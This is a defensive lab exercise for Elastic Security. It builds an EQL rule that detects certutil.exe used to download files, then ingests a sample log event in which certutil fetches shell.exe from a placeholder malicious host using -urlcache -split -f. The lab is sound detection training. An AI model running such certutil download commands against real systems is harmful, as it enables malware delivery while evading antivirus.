# Lab 28: Suspicious Process Detection (EQL Correlation)

## Objective
Detect "Living off the Land" attacks where an attacker uses system tools like `certutil.exe` to download malicious files, using Event Correlation (EQL).

## Prerequisites
- Elasticsearch and Kibana v8.x are running.
- Index `logs-endpoint.events.process-default` exists or will be created.

## Steps

### Step 1: Create the Detection Rule
1. Navigate to **Security** > **Rules**.
2. Click **Create new rule**.
3. **Rule Type**: Select **Event Correlation (EQL)**.
4. **Define Query**: Enter the following EQL query:
   ```eql
   process where process.name == "certutil.exe" and 
   process.args : ("*urlcache*", "*split*", "*download*")
   ```
5. **About Rule**:
   - **Name**: `Suspicious Certutil Download`
   - **Severity**: `Critical`
6. Click **Create and activate**.

### Step 2: Ingest Sample Data
Simulate an attacker using `certutil` to download a shell script. Run this in **Dev Tools**:

```json
POST /logs-endpoint.events.process-default/_doc
{
  "@timestamp": "2026-03-04T10:05:00Z",
  "process.name": "certutil.exe",
  "process.args": ["-urlcache", "-split", "-f", "http://malicious-site.com/shell.exe"],
  "host.name": "HR-Laptop-01",
  "user.name": "jdoe"
}
```

### Expected Output
1. Navigate to **Security** > **Alerts**.
2. Click on the alert name **Suspicious Certutil Download**.
3. In the flyout, observe:
   - **Process Interactive**: Shows the full command line with `-urlcache -split`.
   - **User**: `jdoe`
   - **Host**: `HR-Laptop-01`
   - **EQL Match**: Shows exactly why it triggered (matching the process name and args).

💡 **Why?** Attackers prefer using built-in Windows/Linux tools ("Living off the Land") because they are often whitelisted by antivirus. EQL is perfect for correlating these specific process arguments.
